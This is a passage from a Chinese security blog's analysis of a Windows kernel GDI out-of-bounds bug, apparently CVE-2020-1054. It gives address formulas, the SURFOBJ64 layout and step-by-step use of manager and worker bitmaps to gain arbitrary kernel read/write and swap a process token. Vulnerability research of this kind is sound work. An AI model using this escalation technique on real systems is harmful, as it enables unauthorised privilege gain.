pSurface-&gt;SurfObj.lDelta;</span><br></pre></td></tr></table></figure><p>地址写时的oobAddr:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oobAddr&#x3D; result + 4 (pStrrun-&gt;xrl.xPos &gt;&gt; 5)</span><br><span class="line">          + loopCount * pSurface-&gt;SurfObj.lDelta;</span><br></pre></td></tr></table></figure><p>此时条件为：</p><ol><li><p>已有漏洞分配的BITMAP1，地址为addr</p></li><li><p>可控制oobAddr读时的地址 addr + offset</p></li><li><p>可控制oobAddr写时的地址 addr + offset + diff（diff = 0xa2a0 * 0xb = 0x6fce0）</p></li></ol><p>Exploit 在相对于漏洞内核对象偏移0x100000000+0x358处进行内存读取,然后在最后一次循环时在0x100000000+0x70038处写入内容，分配的BITMAP大小为0x7000</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-image-20210513114748217.png" alt="image-20210513114748217"></p><h3><span id="p4-zi-jie-di-zhi-du-xie-dao-ren-yi-di-zhi-du-xie">4字节地址读写到任意地址读写</span><a href="#p4-zi-jie-di-zhi-du-xie-dao-ren-yi-di-zhi-du-xie" class="header-anchor">#</a></h3><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png" alt="12" style="zoom:50%"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ64</span> &#123;</span> pvScan0偏移<span class="number">0x38</span></span><br><span class="line">	ULONG64  dhsurf; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  hsurf;  <span class="comment">// +8</span></span><br><span class="line">	ULONG64  dhpdev; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  hdev;   <span class="comment">// +8</span></span><br><span class="line">	SIZEL  sizlBitmap; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  cjBits; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  pvBits; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  pvScan0;</span><br><span class="line">	LONG32  lDelta;</span><br><span class="line">	ULONG32  iUniq;</span><br><span class="line">	ULONG32  iBitmapFormat;</span><br><span class="line">	USHORT  iType;</span><br><span class="line">	USHORT  fjBitmap;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="keyword">operator</span>=(<span class="keyword">const</span> SURFOBJ32 &amp;surf )</span><br><span class="line">	&#123;</span><br><span class="line">		dhsurf = surf.dhsurf;</span><br><span class="line">		hsurf = surf.hsurf;</span><br><span class="line">		dhpdev = surf.dhpdev;</span><br><span class="line">		hdev = surf.hdev;</span><br><span class="line">		sizlBitmap = surf.sizlBitmap;</span><br><span class="line">		cjBits = surf.cjBits;</span><br><span class="line">		pvBits = surf.pvBits;</span><br><span class="line">		pvScan0 = surf.pvScan0;</span><br><span class="line">		lDelta = surf.lDelta;</span><br><span class="line">		iUniq = surf.iUniq;</span><br><span class="line">		iBitmapFormat = surf.iBitmapFormat;</span><br><span class="line">		iType = surf.iType;</span><br><span class="line">		fjBitmap = surf.fjBitmap;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125; SURFOBJ64;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagSize</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LONG cx;</span><br><span class="line">    LONG cy;</span><br><span class="line">&#125; SIZE,*PSIZE,*LPSIZE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> SIZE SIZEL;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Specifies a SIZEL structure that contains the width and height, in pixels, of the bitmap. A SIZEL structure is identical to a SIZE structure.</span><br></pre></td></tr></table></figure><p><code>SIZEL sizlBitmap</code>，是限定位图的长宽的，即存储Pixel Data的长宽大小，四字节写也就表明可以修改Pixel Data的大小（cx或者cy）</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-05-image-20210513115659924.png" alt="image-20210513115659924"></p><p><strong>利用过程</strong>：</p><ul><li>CreateCompatibleBitmap申请VulBITMAP，并获得VulBITMAP的内核地址</li><li>计算oob读写地址</li><li>在oob读地址处申请BITMAP1，在oob写处申请BITMAP2，大小为0x7000</li><li>触发漏洞，读取BITMAP1中的sIzlBitmap值，修改BITMAP2对象的sizlBitmap值，对BITMAP2使用SetBitmapBits和GetBitmapBits越界读写BITMAP3的pvScan0</li><li>BITMAP2作为Manager，BITMAP3作为worker，实现任意读写，替换token等提权</li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_c57402a45a6b759e664eb6ee99ee3c1d.png" alt="3"></p><h3><span id="pcan-kao-lian-jie">参考链接</span><a href="#pcan-kao-lian-jie" class="header-anchor">#</a></h3><ul><li><a href="https://www.anquanke.com/post/id/209329">https://www.anquanke.com/post/id/209329</a></li><li><a href="https://0xeb-bp.com/blog/2020/06/15/cve-2020-1054-analysis.html">https://0xeb-bp.com/blog/2020/06/15/cve-2020-1054-analysis.html</a></li><li><a href="https://bbs.pediy.com/thread-260884.htm">https://bbs.pediy.com/thread-260884.htm</a></li></ul></div><div class="article-tags size-small mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/research/">research</a><a class="link-muted mr-2" rel="tag" href="/tags/windows/">windows</a></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_dd" href="https://www.addtoany.com/share"></a><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_telegram"></a><a class="a2a_button_whatsapp"></a><a class="a2a_button_reddit"></a></div><script src="https://static.addtoany.com/menu/page.js" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button is-info donate"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/images/alipay.jpeg" alt="支付宝"></span></a><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/images/wechatpay.jpeg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/84f38a6d.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">NTFUZZ: Enabling Type-Aware Kernel Fuzzing on Windows with Static Binary Analysis(S&amp;P 2021)</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/c3516a94.html"><span class="level-item">Detecting Code Clones with Graph Neural Network and Flow-Augmented Abstract Syntax Tree(SANER 2020)</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({el:"#valine-thread",appId:"arzLjs0uhdNidwVh9BC6XEl2-gzGzoHsz",appKey:"UTxl8VuzUJM8vVhRdRKuNIM6",placeholder:"ヾﾉ≧∀≦)o 来呀！快活呀！~",avatar:"mm",meta:["nick","mail","link"],pageSize:10,lang:"zh-CN",highlight:!0,requiredFields:[]})</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen order-1 is-sticky"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://www.gravatar.com/avatar/9b722a00f4fc188a2dbfa47ac65b8773?s=128" alt="食兔人"></figure><p class="title is-size-4 is-block line-height-inherit">食兔人</p><p class="is-size-6 is-block">学生,信息安全爱好者</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>北京,中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">104</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">35</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">35</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ycdxsb" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ycdxsb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/ycdxsb"><i class="fab fa-twitter"></i></a></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://m0te.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Mote</span></span><span class="level-right"><span class="level-item tag">m0te.top</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://yurisec.cn/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Yuri</span></span><span class="level-right"><span class="level-item tag">yurisec.cn</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://blog.6237.cf" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Mad</span></span><span class="level-right"><span class="level-item tag">blog.6237.cf</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/06/"><span class="level-start"><span class="level-item">六月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/09/"><span class="level-start"><span class="level-item">九月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">28</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=ycdxsb/fVNc&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="ycdxsb/fVNc" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="订阅"></div></div><p class="help">邮件订阅，更新早知道</p></form></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">2</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/AI/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/AI/machine-learning/"><span class="level-start"><span class="level-item">machine_learning</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">48</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/CVE/"><span class="level-start"><span class="level-item">CVE</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/crypto/"><span class="level-start"><span class="level-item">crypto</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/pentest/"><span class="level-start"><span class="level-item">pentest</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">24</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/pwnable-kr/"><span class="level-start"><span class="level-item">pwnable.kr</span></span><span class="level-end"><span class="level-item tag">21</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/pwnable-kr/Toddler-sBottle/"><span class="level-start"><span class="level-item">Toddler&#039;sBottle</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/stack-overflow/"><span class="level-start"><span class="level-item">stack_overflow</span></span><span class="level-end"><span class="level-item tag">3</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/stack-overflow/ROP-Emporium/"><span class="level-start"><span class="level-item">ROP_Emporium</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/re/"><span class="level-start"><span class="level-item">re</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/writeup/"><span class="level-start"><span class="level-item">writeup</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/"><span class="level-start"><span class="level-item">PyQt5</span></span><span class="level-end"><span class="level-item tag">12</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/Web/"><span class="level-start"><span class="level-item">Web</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"><span class="level-start"><span class="level-item">图书馆管理系统</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/life/"><span class="level-start"><span class="level-item">life</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/"><span class="level-start"><span class="level-item">papers</span></span><span class="level-end"><span class="level-item tag">17</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/papers/security/"><span class="level-start"><span class="level-item">security</span></span><span class="level-end"><span class="level-item tag">17</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/papers/security/automatic-analyse/"><span class="level-start"><span class="level-item">automatic_analyse</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/binary-analyse/"><span class="level-start"><span class="level-item">binary_analyse</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/fuzz/"><span class="level-start"><span class="level-item">fuzz</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/mobile-security/"><span class="level-start"><span class="level-item">mobile_security</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/others/"><span class="level-start"><span class="level-item">others</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/security-situation-awareness/"><span class="level-start"><span class="level-item">security_situation_awareness</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/research/"><span class="level-start"><span class="level-item">research</span></span><span class="level-end"><span class="level-item tag">20</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/research/Fuzz/"><span class="level-start"><span class="level-item">Fuzz</span></span><span class="level-end"><span class="level-item tag">1</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/research/Fuzz/FuzzingBook/"><span class="level-start"><span class="level-item">FuzzingBook</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/research/HEVD/"><span class="level-start"><span class="level-item">HEVD</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/research/codeql/"><span class="level-start"><span class="level-item">codeql</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/research/linux-kernel/"><span class="level-start"><span class="level-item">linux_kernel</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/research/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/tools/"><span class="level-start"><span class="level-item">tools</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/work/"><span class="level-start"><span class="level-item">work</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content size-small"><p><time datetime="2021-09-18T02:43:00.000Z">2021-09-18</time></p><p class="title is-6"><a class="link-muted" href="/a0dc8841.html">2021 5space 第五空间线上部分writeup</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/writeup/">writeup</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2021-09-01T02:43:00.000Z">2021-09-01</time></p><p class="title is-6"><a class="link-muted" href="/25dfb119.html">BUUCTF Crypto writeup</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/writeup/">writeup</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2021-08-19T07:04:00.000Z">2021-08-19</time></p><p class="title is-6"><a class="link-muted" href="/6f260b49.html">FuzzingBook学习 Part2-1</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/research/">research</a> / <a class="link-muted" href="/categories/research/Fuzz/">Fuzz</a> / <a class="link-muted" href="/categories/research/Fuzz/FuzzingBook/">FuzzingBook</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2021-07-27T14:14:00.000Z">2021-07-27</time></p><p class="title is-6"><a class="link-muted" href="/6c5275ae.html">CVE-2020-0796(SMBGhost) RCE 复现</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/pentest/">pentest</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2021-07-06T02:43:00.000Z">2021-07-06</time></p><p class="title is-6"><a class="link-muted" href="/c165a3fd.html">0CTF 2021 划水小记</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/writeup/">writeup</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">48</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Fuzz/"><span class="tag">Fuzz</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/FuzzingBook/"><span class="tag">FuzzingBook</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/HEVD/"><span class="tag">HEVD</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/NLP/"><span class="tag">NLP</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PyQt5/"><span class="tag">PyQt5</span><span class="tag is-grey-lightest">12</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP-Emporium/"><span class="tag">ROP Emporium</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Toddler-s-Bottle/"><span class="tag">Toddler&#039;s Bottle</span><span class="tag is-grey-lightest">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Web/"><span class="tag">Web</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/automatic-analyse/"><span class="tag">automatic analyse</span><span class="tag is-grey-lightest">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/binary-analyse/"><span class="tag">binary analyse</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/codeql/"><span class="tag">codeql</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/life/"><span class="tag">life</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux-kernel/"><span class="tag">linux kernel</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/machine-learning/"><span class="tag">machine learning</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mobile-security/"><span class="tag">mobile security</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/others/"><span class="tag">others</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/paper/"><span class="tag">paper</span><span class="tag is-grey-lightest">17</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pentest/"><span class="tag">pentest</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag is-grey-lightest">24</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable.kr</span><span class="tag is-grey-lightest">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/re/"><span class="tag">re</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/research/"><span class="tag">research</span><span class="tag is-grey-lightest">19</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security/"><span class="tag">security</span><span class="tag is-grey-lightest">17</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security-situation-awareness/"><span class="tag">security situation awareness</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/stack-overflow/"><span class="tag">stack overflow</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tools/"><span class="tag">tools</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/work/"><span class="tag">work</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeup/"><span class="tag">writeup</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"><span class="tag">数据库</span><span class="tag is-grey-lightest">11</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">食兔人的博客</a><p class="size-small"><span>&copy; 2021 ycdxsb</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("zh-CN")</script><script>var IcarusThemeSettings={site:{url:"https://blog.ycdxsb.cn",external_link:{enable:!0,exclude:[]}},article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
